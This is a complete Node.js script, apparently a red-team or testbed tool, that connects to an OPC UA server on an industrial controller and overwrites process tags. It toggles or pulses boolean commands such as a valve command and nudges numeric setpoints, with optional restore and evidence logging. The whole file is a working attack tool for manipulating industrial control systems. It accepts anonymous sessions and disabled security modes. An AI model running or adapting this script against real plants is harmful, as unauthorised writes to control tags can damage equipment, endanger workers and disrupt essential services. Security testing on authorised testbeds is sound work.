// /scripts/opcua-overwriter/opcua-overwriter.mjs
import fs from "fs";
import path from "path";
import yargs from "yargs";
import { hideBin } from "yargs/helpers";
import opcua from "node-opcua";

const {
  OPCUAClient,
  MessageSecurityMode,
  SecurityPolicy,
  AttributeIds,
  DataType,
  StatusCodes,
  coerceNodeId,
  UserTokenType,
} = opcua;

const argv = yargs(hideBin(process.argv))
  .option("endpoint", { alias: "e", type: "string", default: "opc.tcp://plc:4840" })
  .option("node",     {           type: "string", demandOption: true, describe: "Target NodeId (e.g., ns=1;s=valve_cmd)" })
  .option("user",     { alias: "u", type: "string", default: "" })
  .option("pass",     { alias: "p", type: "string", default: "" })
  .option("x509UserCert", { type: "string", describe: "Path to user X.509 cert (PEM)" })
  .option("x509UserKey",  { type: "string", describe: "Path to user X.509 private key (PEM)" })
  .option("nudgeAbs", {           type: "number", describe: "Absolute nudge for numeric tags (e.g., 0.5)" })
  .option("nudge",    {           type: "number", describe: "Fractional nudge of span (requires EURange discovery; use nudgeAbs if unsure)" })
  .option("pulseMs",  {           type: "number", default: 1500, describe: "Boolean pulse duration (ms) if used" })
  .option("hold",     {           type: "number", default: 0,    describe: "Seconds to hold modified numeric value before restore" })
  .option("restore",  {           type: "boolean", default: false, describe: "Restore original value after hold/pulse" })
  .option("evidence", {           type: "string", describe: "Path to JSONL evidence file (append)" })
  .option("policy",   {           type: "string", default: "Basic256Sha256", choices: ["None","Basic256Sha256","Aes128_Sha256_RsaOaep"] })
  .option("mode",     {           type: "string", default: "SignAndEncrypt", choices: ["None","Sign","SignAndEncrypt"] })
  .option("pki",      {           type: "string", default: process.env.XDG_CONFIG_HOME
                                                  ? path.join(process.env.XDG_CONFIG_HOME, "node-opcua-default-nodejs", "PKI")
                                                  : path.join(process.env.HOME || "/root", ".config", "node-opcua-default-nodejs", "PKI") })
  .option("regenClientCert", { type: "boolean", default: false })
  .strict()
  .help()
  .argv;

function nowIso() { return new Date().toISOString(); }
function logEv(obj) {
  if (!argv.evidence) return;
  fs.appendFileSync(argv.evidence, JSON.stringify({ t: nowIso(), ...obj }) + "\n");
}

// Best-effort PKI prep (let node-opcua create if missing)
function ensurePki() {
  const ownDir = path.join(argv.pki, "own");
  if (argv.regenClientCert && fs.existsSync(ownDir)) {
    fs.rmSync(ownDir, { recursive: true, force: true });
  }
  fs.mkdirSync(argv.pki, { recursive: true });
}

async function getUserIdentity() {
  if (argv.x509UserCert && argv.x509UserKey) {
    return {
      type: UserTokenType.Certificate,
      certificateData: fs.readFileSync(argv.x509UserCert),
      privateKey: fs.readFileSync(argv.x509UserKey, "utf8"),
    };
  }
  if (argv.user) {
    return { type: UserTokenType.UserName, userName: argv.user, password: argv.pass || "" };
  }
  return null; // anonymous
}

function secPolicyFromStr(s) {
  switch (s) {
    case "None": return SecurityPolicy.None;
    case "Aes128_Sha256_RsaOaep": return SecurityPolicy.Aes128_Sha256_RsaOaep;
    default: return SecurityPolicy.Basic256Sha256;
  }
}
function secModeFromStr(s) {
  switch (s) {
    case "None": return MessageSecurityMode.None;
    case "Sign": return MessageSecurityMode.Sign;
    default: return MessageSecurityMode.SignAndEncrypt;
  }
}

async function main() {
  ensurePki();
  const policy = secPolicyFromStr(argv.policy);
  const mode   = secModeFromStr(argv.mode);

  const client = OPCUAClient.create({
    applicationName: "ICS-Testbed-Overwriter",
    endpointMustExist: false,
    securityPolicy: policy,
    securityMode: mode,
    // Let node-opcua manage certs in argv.pki automatically
    requestedSessionTimeout: 60_000,
    connectionStrategy: { initialDelay: 200, maxRetry: 1 },
    certificateFile: path.join(argv.pki, "own", "certs", "client_certificate.pem"),
    privateKeyFile:  path.join(argv.pki, "own", "private", "private_key.pem"),
  });

  const id = await getUserIdentity();
  const who = id
    ? (id.type === UserTokenType.Certificate ? "x509-user" : "user")
    : "anonymous";

  console.log(`[+] Connecting (${mode}/${policy}) to ${argv.endpoint} as ${who} ...`);
  await client.connect(argv.endpoint);

  let session;
  try {
    session = await client.createSession(id || undefined);
  } catch (e) {
    await client.disconnect();
    throw e;
  }

  try {
    const nid = coerceNodeId(argv.node);
    // Robust single-node read
    const dv = await session.readVariableValue(nid);
    if (!dv || !dv.statusCode || dv.statusCode.isNot(StatusCodes.Good)) {
      throw new Error(`Read failed: ${dv?.statusCode?.toString() || "unknown"}`);
    }

    const v = dv.value;
    const dt = v?.dataType;
    const cur = v?.value;

    console.log(`[i] Target: ${argv.node}  DataType=${DataType[dt] ?? dt}  cur=${cur}`);
    logEv({ event: "read", node: argv.node, dataType: DataType[dt] ?? dt, cur, status: dv.statusCode.toString() });

    if (dt === DataType.Boolean) {
      // pulse if pulseMs>0, else toggle
      const newVal = !cur;
      const w1 = await session.writeSingleNode(nid, { dataType: DataType.Boolean, value: newVal });
      console.log(`[i] Boolean write -> ${newVal}: ${w1.toString()}`);
      logEv({ event: "write", node: argv.node, new: newVal, status: w1.toString() });

      if (argv.pulseMs && argv.pulseMs > 0) {
        await new Promise(r => setTimeout(r, argv.pulseMs));
        if (argv.restore) {
          const w2 = await session.writeSingleNode(nid, { dataType: DataType.Boolean, value: cur });
          console.log(`[i] Restored boolean -> ${cur}: ${w2.toString()}`);
          logEv({ event: "restore", node: argv.node, val: cur, status: w2.toString() });
        }
      }
      console.log("[+] Done.");
      return;
    }

    if ([DataType.Float, DataType.Double, DataType.Int16, DataType.Int32, DataType.Int64, DataType.UInt16, DataType.UInt32, DataType.UInt64].includes(dt)) {
      let delta;
      if (typeof argv.nudgeAbs === "number") {
        delta = argv.nudgeAbs;
      } else if (typeof argv.nudge === "number") {
        // Try to discover EURange (optional). If missing, refuse fractional nudge.
        const euRange = await tryReadEURange(session, nid);
        if (!euRange) {
          throw new Error("No EURange found; use --nudgeAbs for numeric tags.");
        }
        delta = (euRange.high - euRange.low) * argv.nudge;
      } else {
        throw new Error("Provide --nudgeAbs or --nudge for numeric targets.");
      }

      const target = Number(cur) + Number(delta);
      const w1 = await session.writeSingleNode(nid, { dataType: dt, value: target });
      console.log(`[i] Numeric write -> ${target}: ${w1.toString()}`);
      logEv({ event: "write", node: argv.node, new: target, old: cur, delta, status: w1.toString() });

      if (argv.restore && argv.hold > 0) {
        await new Promise(r => setTimeout(r, argv.hold * 1000));
        const w2 = await session.writeSingleNode(nid, { dataType: dt, value: cur });
        console.log(`[i] Restored numeric -> ${cur}: ${w2.toString()}`);
        logEv({ event: "restore", node: argv.node, val: cur, status: w2.toString() });
      }
      console.log("[+] Done.");
      return;
    }

    console.log("[!] Target is neither Boolean nor numeric; nothing done.");
    logEv({ event: "noop", node: argv.node, reason: "neither boolean nor numeric", dt: DataType[dt] ?? dt });

  } finally {
    if (session) await session.close();
    await client.disconnect();
  }
}

async function tryReadEURange(session, nid) {
  try {
    // Browse for a child property named EURange
    const browseRes = await session.browse({
      nodeId: nid,
      referenceTypeId: "HasProperty",
      includeSubtypes: true,
      browseDirection: opcua.BrowseDirection.Forward,
      resultMask: opcua.makeResultMask("ReferenceType | IsForward | BrowseName | NodeClass | TypeDefinition | DisplayName")
    });
    const eur = browseRes?.references?.find(r => r.browseName?.name === "EURange");
    if (!eur) return null;
    const dv = await session.readVariableValue(eur.nodeId);
    const val = dv?.value?.value;
    if (val && typeof val.low === "number" && typeof val.high === "number") {
      return val; // { low, high }
    }
  } catch (_) { /* ignore */ }
  return null;
}

main().catch(err => {
  console.error("[!] Error:", err.message || err);
  process.exit(1);
});
